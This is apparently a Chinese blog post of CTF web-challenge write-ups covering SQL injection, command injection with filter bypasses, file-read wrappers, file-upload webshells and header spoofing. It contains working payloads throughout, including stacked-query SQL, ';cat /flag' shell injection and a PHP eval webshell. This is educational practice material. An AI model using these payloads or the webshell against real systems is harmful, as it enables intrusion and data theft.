<p>最终，成功找出flag！</p>
<p>解出！</p>

        <h1 id="四、-强网杯-2019-随便注-1"   >
          <a href="#四、-强网杯-2019-随便注-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#四、-强网杯-2019-随便注-1" class="headerlink" title="四、[强网杯 2019]随便注 1"></a>四、[强网杯 2019]随便注 1</h1>
      <p>打开后界面如下</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202207281508416.png" alt="image-20220728150850249"></p>
<p>首先尝试一下提交 </p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1</span><br></pre></td></tr></table></div></figure>

<p>于是出现</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202207281509707.png" alt="image-20220728150904532"></p>
<p>再用单引号判断是否有sql注入</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202207281509461.png" alt="image-20220728150949317"></p>
<p>出错了，则说明有sql注入</p>
<p>（PS：用单引号判断是否有sql注入，即在参数后面加上单引号，如果页面返回错误，则存在。会因为单引号个数不匹配而报错）</p>
<p>再查询一下表</p>
<p>（PS：在sql中，分号表示一条语句的结束。如果在分号的后面再加一条语句，这条语句也可以被执行，在分号后面加#，则表示结束）</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202207281520159.png" alt="image-20220728152001997"></p>
<p>再分别查看表的结构</p>
<p>1919810931114514:</p>
<p>输入</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;;show columns from `1919810931114514`;</span><br></pre></td></tr></table></div></figure>

<p>(PS:表名为数字时，要用反引号)</p>
<p>(数字前后是反单引号，不是单引号)</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202207281521757.png" alt="image-20220728152100582"></p>
<p>words:</p>
<p>输入</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;;show columns from words;</span><br></pre></td></tr></table></div></figure>

<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202207281521643.png" alt="image-20220728152143473"></p>
<p>显然，flag存在于1919810931114514表中</p>

        <h3 id="法Ⅰ：可以通过修改表名来获取flag"   >
          <a href="#法Ⅰ：可以通过修改表名来获取flag" class="heading-link"><i class="fas fa-link"></i></a><a href="#法Ⅰ：可以通过修改表名来获取flag" class="headerlink" title="法Ⅰ：可以通过修改表名来获取flag"></a>法Ⅰ：可以通过修改表名来获取flag</h3>
      <p>将表1919810931114514的名字改为words,flag列名字改为id，就能获取flag</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">修改表名(将表名user改为users)</span><br><span class="line">alter table user rename to users;</span><br><span class="line"></span><br><span class="line">修改列名(将字段名username改为name)</span><br><span class="line">alter table users change uesrname name varchar(30);</span><br></pre></td></tr></table></div></figure>

<p>即</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;；alter table words rename to word1;alter table `1919810931114514` rename to words;alter table words change flag id varchar(50);#</span><br></pre></td></tr></table></div></figure>

<p>最后再输入</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; or 1=1#</span><br></pre></td></tr></table></div></figure>

<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202207281537442.png" alt="image-20220728153711380"></p>

        <h3 id="法Ⅱ：利用open和handler"   >
          <a href="#法Ⅱ：利用open和handler" class="heading-link"><i class="fas fa-link"></i></a><a href="#法Ⅱ：利用open和handler" class="headerlink" title="法Ⅱ：利用open和handler"></a>法Ⅱ：利用open和handler</h3>
      <p>输入</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;;handler `1919810931114514` open as `a`;handler `a` read next;#</span><br></pre></td></tr></table></div></figure>

<p>（PS：a可随意变换名称）</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202207281528838.png" alt="image-20220728152844776"></p>

        <h3 id="法Ⅲ：MySQL的预处理"   >
          <a href="#法Ⅲ：MySQL的预处理" class="heading-link"><i class="fas fa-link"></i></a><a href="#法Ⅲ：MySQL的预处理" class="headerlink" title="法Ⅲ：MySQL的预处理"></a>法Ⅲ：MySQL的预处理</h3>
      <p>尝试一下输入</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select</span><br></pre></td></tr></table></div></figure>

<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202207281531577.png" alt="image-20220728153131520"></p>
<p>得出括号里的一堆都被过滤掉了，可以利用预处理机制prepare和concat函数拼接获得select，再用exeute来执行，通过大写绕过</p>
<p>输入</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;;PREPARE st from concat(&#x27;sel&#x27;,&#x27;ect&#x27;,  &#x27;* from `1919810931114514`&#x27;);EXECUTE st;#</span><br></pre></td></tr></table></div></figure>

<p>（PS：括号里前两个单引号的内容合在一起应该是被过滤掉的东西，但必须分开）</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202207281532121.png" alt="image-20220728153220056"></p>
<p>OVER！</p>

        <h1 id="五、-ACTF2020-新生赛-Exec-1"   >
          <a href="#五、-ACTF2020-新生赛-Exec-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#五、-ACTF2020-新生赛-Exec-1" class="headerlink" title="五、[ACTF2020 新生赛]Exec 1"></a>五、[ACTF2020 新生赛]Exec 1</h1>
      <p>点开后</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202207281542627.png" alt="image-20220728154217574"></p>
<p>ping，命令执行</p>
<p>直接输入</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">;cat /flag</span><br></pre></td></tr></table></div></figure>

<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202207281546660.png" alt="image-20220728154658611"></p>
<p>flag就来了 </p>
<p>PS:</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ping ;ls   打开当前根目录</span><br><span class="line">ping ;ls \  列出根目录\下的所有目录</span><br><span class="line">ping ;cat \ 打开\下的文件</span><br></pre></td></tr></table></div></figure>

<p>附：ping命令</p>
<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://blog.csdn.net/m0_50317371/article/details/110489711" >https://blog.csdn.net/m0_50317371/article/details/110489711</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>

        <h1 id="六、-极客大挑战-2019-Secret-File-1"   >
          <a href="#六、-极客大挑战-2019-Secret-File-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#六、-极客大挑战-2019-Secret-File-1" class="headerlink" title="六、[极客大挑战 2019]Secret File 1"></a>六、[极客大挑战 2019]Secret File 1</h1>
      <p>打开就是</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202207281554720.png" alt="image-20220728155426652"></p>
<p>熟练的查看源代码</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202207281555520.png" alt="image-20220728155505451"></p>
<p>点开瞧一瞧</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202207281555262.png" alt="image-20220728155519172"></p>
<p>再点击SECRET瞧一瞧</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202207281555511.png" alt="image-20220728155533470"></p>
<p>果然，没那么简单~但这也是一种提示吧，让我们再回去即上一个界面看看</p>
<p>抓个包试试</p>
<p>(方法:退回上一界面，开启proxy，再点击SECRET)</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202207281616889.png" alt="image-20220728161627792"></p>
<p>这已经是很明显的提示了，访问一下这个secr3t.php</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202207281617712.png" alt="image-20220728161702651"></p>
<p>更明显了这个</p>
<p>和“三”同理，读取文件源码</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=php://filter/read=convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></div></figure>

<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202207281625622.png" alt="image-20220728162456844"></p>
<p>便出现了一串长长长长长长的字符，再利用CyberChef解码</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202207281625219.png" alt="image-20220728162540153"></p>
<p>这不就来了？</p>

        <h1 id="七、-GXYCTF2019-Ping-Ping-Ping-1"   >
          <a href="#七、-GXYCTF2019-Ping-Ping-Ping-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#七、-GXYCTF2019-Ping-Ping-Ping-1" class="headerlink" title="七、[GXYCTF2019]Ping Ping Ping 1"></a>七、[GXYCTF2019]Ping Ping Ping 1</h1>
      <p>打开后</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202207281627904.png"></p>
<p>显然，由题名可得又是命令执行</p>
<p>打开一下当前目录</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?ip=;ls</span><br></pre></td></tr></table></div></figure>

<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202207281627727.png" alt="image-20220728162755671"></p>
<p>尝试打开flag文件</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?ip=;cat flag</span><br></pre></td></tr></table></div></figure>

<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202207281628024.png" alt="image-20220728162829966"></p>
<p>space表明网站对空格进行了过滤，应该想办法绕过空格，方法有：</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$IFS  //此题不行</span><br><span class="line">$&#123;IFS&#125;</span><br><span class="line">$IFS$1 //1改成加其他数字貌似都行</span><br><span class="line">&lt;</span><br><span class="line">&lt;&gt;</span><br><span class="line">&#123;cat,flag.php&#125; //用逗号实现了空格功能</span><br><span class="line">%20</span><br><span class="line">%09</span><br></pre></td></tr></table></div></figure>

<p>于是我们尝试输入</p>
<p><code>/?ip=;cat$IFS$1flag.php</code></p>
<p>然鹅</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202207281629238.png" alt="image-20220728162923192"></p>
<p>flag也被过滤了</p>

        <h3 id="法Ⅰ：用其他变量把flag拼接"   >
          <a href="#法Ⅰ：用其他变量把flag拼接" class="heading-link"><i class="fas fa-link"></i></a><a href="#法Ⅰ：用其他变量把flag拼接" class="headerlink" title="法Ⅰ：用其他变量把flag拼接"></a>法Ⅰ：用其他变量把flag拼接</h3>
      <p>即：用某一变量代替flag中的某一部分</p>
<p>输入</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?ip=;b=g;cat$IFS$1fla$b.php  //$b即g</span><br></pre></td></tr></table></div></figure>

<p>回车后查看网页源代码</p>
<p>!<img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202207281631585.png" alt="image-20220728163134531"></p>

        <h3 id="法Ⅱ：对cat-flag-php进行base64加密"   >
          <a href="#法Ⅱ：对cat-flag-php进行base64加密" class="heading-link"><i class="fas fa-link"></i></a><a href="#法Ⅱ：对cat-flag-php进行base64加密" class="headerlink" title="法Ⅱ：对cat flag.php进行base64加密"></a>法Ⅱ：对cat flag.php进行base64加密</h3>
      <p><img src="https://gitee.com/PiDanX/image-bed/raw/master//Img/202201141529604.png" alt="image-20220114152923516"></p>
<p>由于过滤掉了bash，就用sh</p>
<p>即输入</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?ip=;echo$IFS$1Y2F0IGZsYWcucGhw|base64$IFS$1-d|sh</span><br></pre></td></tr></table></div></figure>

<p>回车后查看网页源代码</p>
<p><img src="https://gitee.com/PiDanX/image-bed/raw/master//Img/202201141532132.png" alt="image-20220114153215098"></p>

        <h3 id="法Ⅲ：内联执行"   >
          <a href="#法Ⅲ：内联执行" class="heading-link"><i class="fas fa-link"></i></a><a href="#法Ⅲ：内联执行" class="headerlink" title="法Ⅲ：内联执行"></a>法Ⅲ：内联执行</h3>
      <p>反引号内的命令优先执行</p>
<p>举个栗子：</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ a=flag;</span><br><span class="line">cat `echo $a` //即cat flag</span><br></pre></td></tr></table></div></figure>

<p>输入</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?ip=;cat$IFS$1`ls`   //因为flag本就在当前根目录下，所以反引号内为ls</span><br></pre></td></tr></table></div></figure>

<p>回车后查看网页源代码</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202207281637876.png" alt="image-20220728163746817"></p>
<p>都有了</p>

        <h1 id="八、-极客大挑战-2019-Knife-1"   >
          <a href="#八、-极客大挑战-2019-Knife-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#八、-极客大挑战-2019-Knife-1" class="headerlink" title="八、[极客大挑战 2019]Knife 1"></a>八、[极客大挑战 2019]Knife 1</h1>
      <p>打开后就是</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202207281638623.png" alt="image-20220728163823560"></p>
<p>本身的题目名加上打开界面的“菜刀”，已经在明示了使用菜刀，蚁剑也可</p>
<p>界面已经提示密码是Syc了</p>
<p>打开蚁剑，添加数据</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202207312020462.png" alt="image-20220731202004334"></p>
<p>添加完毕后选择“文件管理”</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202207312020456.png" alt="image-20220731202040332"></p>
<p>在文件中可以看见有flag文件</p>
<p><img src="https://gitee.com/PiDanX/image-bed/raw/master//Img/202201151650024.png" alt="image-20220115164959958"></p>
<p>点击后发现flag就在文件内</p>
<p><img src="https://gitee.com/PiDanX/image-bed/raw/master//Img/202201151650572.png" alt="image-20220115165027520"></p>
<p>成功！</p>

        <h1 id="九、-极客大挑战-2019-Http-1"   >
          <a href="#九、-极客大挑战-2019-Http-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#九、-极客大挑战-2019-Http-1" class="headerlink" title="九、[极客大挑战 2019]Http 1"></a>九、[极客大挑战 2019]Http 1</h1>
      <p>打开后</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202207312052122.png" alt="image-20220731205236040"></p>
<p>查看网页源代码后发现有个Secret.php</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202207312053672.png" alt="image-20220731205323610"></p>
<p>访问一下</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202207312054384.png" alt="image-20220731205406216"></p>
<p>看来是要从图上的网站访问才行</p>

        <h3 id="法Ⅰ：利用插件HackBar"   >
          <a href="#法Ⅰ：利用插件HackBar" class="heading-link"><i class="fas fa-link"></i></a><a href="#法Ⅰ：利用插件HackBar" class="headerlink" title="法Ⅰ：利用插件HackBar"></a>法Ⅰ：利用插件HackBar</h3>
      <p>F12点击这个后选择HackBar</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202207312055825.png" alt="image-20220731205506778"></p>
<p>添加Header</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202207312118505.png" alt="image-20220731211802447"></p>
<p>（URL就是当前网址）</p>
<p>再点击EXECUTE</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202207312118635.png" alt="image-20220731211859524"></p>
<p>看来，还得改一下User-Agent</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202207312120997.png" alt="image-20220731212058923"></p>
<p>点击EXECUTE</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202207312121339.png" alt="image-20220731212129226"></p>
<p>要求还蛮多，那就再改一改X-Forwarded-For</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202207312122412.png" alt="image-20220731212206349"></p>
<p>点击EXECUTE</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202207312122684.png" alt="image-20220731212217561"></p>
<p>出来了</p>

        <h3 id="法Ⅱ：利用Burp-Suite"   >
          <a href="#法Ⅱ：利用Burp-Suite" class="heading-link"><i class="fas fa-link"></i></a><a href="#法Ⅱ：利用Burp-Suite" class="headerlink" title="法Ⅱ：利用Burp Suite"></a>法Ⅱ：利用Burp Suite</h3>
      <p>先是抓包，然后鼠标右键选择</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202207312125764.png" alt="image-20220731212517663"></p>
<p>再和法Ⅰ步骤类似，修改Referer和User-Agent，并添加X-Forwarded-For</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202207312221624.png" alt="image-20220731222135588"></p>
<p>“GO”！</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202207312221855.png" alt="image-20220731222150813"></p>
<p>GO成功！</p>

        <h1 id="十、-极客大挑战-2019-Upload-1"   >
          <a href="#十、-极客大挑战-2019-Upload-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#十、-极客大挑战-2019-Upload-1" class="headerlink" title="十、[极客大挑战 2019]Upload 1"></a>十、[极客大挑战 2019]Upload 1</h1>
      <p>打开后</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202309171457650.png" alt="image-20230917144537665"></p>
<p>提示我们上传图片文件，用记事本写一个一句话木马并将格式改为jpg</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202309171457252.png" alt="image-20230917144725558"></p>
<p>上传后提示我们</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202309171457851.png" alt="image-20230917144756129"></p>
<p>那就只能在记事本里改为：</p>
<p><code>GIF89a</code></p>
<p><code>&lt;script language=&#39;php&#39;&gt;@eval($_POST[shell]);&lt;/script&gt;</code></p>
<p>重新上传后</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202309171457999.png" alt="image-20230917145159795"></p>
<p>说明我们成功绕过检测，抓包一下，更改文件后缀名为.phtml</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202309171500511.png" alt="image-20230917150048441"></p>
<p>然后我们可以试着用蚁剑连接一下</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202309171505712.png" alt="image-20230917150525660"></p>
<p>可以看到连接成功</p>
<p>添加数据右键进入文件管理找flag（一般flag文件在根目录）</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202309171506797.png" alt="image-20230917150631727"></p>
<p>点击flag即可拿到flag</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202309171506518.png" alt="image-20230917150646459"></p>

        <h1 id="十一、-ACTF2020-新生赛-Upload-1"   >
          <a href="#十一、-ACTF2020-新生赛-Upload-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#十一、-ACTF2020-新生赛-Upload-1" class="headerlink" title="十一、[ACTF2020 新生赛]Upload 1"></a>十一、[ACTF2020 新生赛]Upload 1</h1>
      <p>打开后鼠标移到灯泡那里会有上传提示</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202309171515429.png" alt="image-20230917151504289"></p>
<p>选择上一题的test.jpg进行上传，然后抓包</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202309171517549.png" alt="image-20230917151747480"></p>
<p>可以看到上传成功，文件后缀改成phtml再试试，也是成功</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202309171524639.png" alt="image-20230917152447561"></p>
<p>尝试一下用蚁剑连接</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202309171530781.png" alt="image-20230917153003714">也是连接成功，同[极客大挑战 2019]Upload 1找到flag</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202309171531922.png" alt="image-20230917153102858"></p>

        <h1 id="十二、-GXYCTF2019-BabyUpload-1"   >
          <a href="#十二、-GXYCTF2019-BabyUpload-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#十二、-GXYCTF2019-BabyUpload-1" class="headerlink" title="十二、[GXYCTF2019]BabyUpload 1"></a>十二、[GXYCTF2019]BabyUpload 1</h1>
      <p>依然是上传题</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202309201511645.png" alt="image-20230920151158606"></p>
<p>试着上传test.jpg</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202309201512570.png" alt="image-20230920151233540"></p>
<p>上传成功，我们抓包改一下文件后缀为phtml</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202309201514612.png" alt="image-20230920151451582"></p>
<p>看来不太行</p>
<p>但是这道题打开环境之前有个网站提示点进去查看exp.py文件</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202309201516206.png" alt="image-20230920151656161"></p>
<p>上网查了一下发现是要先配置文件，得先上传.htaccess文件，并且内容为</p>
<p><code>SetHandler application/x-httpd-php</code></p>
<p><img src="C:/Users/86173/AppData/Roaming/Typora/typora-user-images/image-20230920151948753.png" alt="image-20230920151948753"></p>
<p>没上传成功，抓包改一下“Content-Type”为image/jpeg</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202309201521467.png" alt="image-20230920152129426"></p>
<p>发现上传成功</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202309201521478.png" alt="image-20230920152157429"></p>
<p>再将test.jpg上传</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202309201525594.png" alt="image-20230920152514565"></p>
<p>发现上传成功（在URL中去掉/var/www/html）</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202309201525182.png" alt="image-20230920152551144"></p>
<p>再到蚁剑连接</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202309201527023.png" alt="image-20230920152721974"></p>
<p>连接成功！</p>
<p>添加数据后查看flag文件</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202309201527736.png" alt="image-20230920152756697"></p>
<p>OVER！</p>

        <h1 id="十三、-MRCTF2020-你传你🐎呢-1"   >
          <a href="#十三、-MRCTF2020-你传你🐎呢-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#十三、-MRCTF2020-你传你🐎呢-1" class="headerlink" title="十三、[MRCTF2020]你传你🐎呢 1"></a>十三、[MRCTF2020]你传你🐎呢 1</h1>
      <p>同 十二、[GXYCTF2019]BabyUpload 1</p>

        <h1 id="十四、-HCTF-2018-WarmUp-1"   >
          <a href="#十四、-HCTF-2018-WarmUp-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#十四、-HCTF-2018-WarmUp-1" class="headerlink" title="十四、[HCTF 2018]WarmUp 1"></a>十四、[HCTF 2018]WarmUp 1</h1>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401021112268.png" alt="image-20240102111212097"></p>
<p>查看网页源代码</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401021112270.png" alt="image-20240102111240218"></p>
<p>提示查看/source.php</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401021113080.png" alt="image-20240102111323993"></p>
<p>通过阅读代码可知</p>
<p><code>highlight_file</code>函数显示当前文件的源代码，<code>__FILE__</code>是一个特殊的常量，表示当前文件的完整路径和文件名</p>
<p>在emmm类中定义了一个公共的静态函数<code>checkFile</code>，它接受一个引用参数<code>$page</code></p>
<p><code>$whitelist = [&quot;source&quot;=&gt;&quot;source.php&quot;,&quot;hint&quot;=&gt;&quot;hint.php&quot;];</code> 这行定义了一个名为<code>$whitelist</code>的数组，包含两个键值对，用于存储允许包含的文件名</p>
<p>最后一个if语句判断检查HTTP请求中是否包含名为<code>file</code>的参数，且这个参数是否为字符串，并通过<code>checkFile</code>函数检查是否在白名单中</p>
<p>先访问新的页面hint</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401021120122.png" alt="image-20240102112052078"></p>
<p>获取到了flag的文件名，以及每个字母重复四次在提示我们是在四层目录之下</p>
<p>构造payload，包含名为file的参数</p>
<p><code>?file=hint.php?../../../../../ffffllllaaaagggg</code></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401021124961.png" alt="image-20240102112429922"></p>
<p>得到flag</p>

        <h1 id="十五、-极客大挑战-2019-BuyFlag-1"   >
          <a href="#十五、-极客大挑战-2019-BuyFlag-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#十五、-极客大挑战-2019-BuyFlag-1" class="headerlink" title="十五、[极客大挑战 2019]BuyFlag 1"></a>十五、[极客大挑战 2019]BuyFlag 1</h1>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401021636859.png" alt="image-20240102163601647"></p>
<p>查看右上角菜单可以看到有一个payflag，点进去之后</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401021636196.png" alt="image-20240102163658086"></p>
<p>可以看到要想获得flag必须满足三个条件，①学生②正确的password③要有100000000的money</p>
<p>查看网页源代码</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401021638992.png" alt="image-20240102163827958"></p>
<p>提示表明要使用POST方法，password的值为404，但是又用了is_numeric()函数进行判断，表示密码不能仅仅是一个数字，但是又只使用了“==”，说明只是弱类型比较，添加随机字母才能使得参数等于数字</p>
<p>所以先使用HackBar进行POST方法给password和money传参</p>
<p><code>password=404a&amp;money=100000000</code></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401021645883.png" alt="image-20240102164540845"></p>
<p>EXECUTE后</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401021647276.png" alt="image-20240102164732243"></p>
<p>就差第一个条件了，再抓包</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401021647760.png"></p>
<p>看到Cookie那儿user（用户）的值为0，在计算机语言中，0通常为假，1通常为真，将user修改为1后发送</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401021649126.png" alt="image-20240102164937096"></p>
<p>又告诉我们数字长度太长了</p>

        <h3 id="法Ⅰ：科学计数法"   >
          <a href="#法Ⅰ：科学计数法" class="heading-link"><i class="fas fa-link"></i></a><a href="#法Ⅰ：科学计数法" class="headerlink" title="法Ⅰ：科学计数法"></a>法Ⅰ：科学计数法</h3>
      <p>使用科学计数法表示就能缩短长度了，100000000改为1e9（表示1后面有9个零，8个零会回显钱不够）</p>
<p>发送之后</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401021655354.png" alt="image-20240102165532310"></p>
<p>得到flag</p>

        <h3 id="法Ⅱ：数组绕过"   >
          <a href="#法Ⅱ：数组绕过" class="heading-link"><i class="fas fa-link"></i></a><a href="#法Ⅱ：数组绕过" class="headerlink" title="法Ⅱ：数组绕过"></a>法Ⅱ：数组绕过</h3>
      <p>上网查查到这个方法，将<code>money=100000000</code>改为<code>money[]=0</code> (0可以为任何小于100000000的数字)</p>

        <h1 id="十六、-BJDCTF2020-Easy-MD5-1"   >
          <a href="#十六、-BJDCTF2020-Easy-MD5-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#十六、-BJDCTF2020-Easy-MD5-1" class="headerlink" title="十六、[BJDCTF2020]Easy MD5 1"></a>十六、[BJDCTF2020]Easy MD5 1</h1>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401021715170.png"></p>
<p>有点不知道怎么做，查看网页源代码也没啥发现，在题目打开界面有一个github链接，点击查看Web目录下的和url同名的文件leveldo4.php</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401021717742.png" alt="image-20240102171756699"></p>
<p>阅读代码，通过GET方法传入参数password的值为ffifdyop，则会跳转到新界面</p>
<p>（也可以直接访问/levels91.php）</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401021719956.png" alt="image-20240102171930880"></p>
<p>查看网页源代码</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401021719570.png" alt="image-20240102171959537"></p>
<p>阅读代码后可知，通过GET方法传入a和b，a和b值不同，但md5值相同</p>
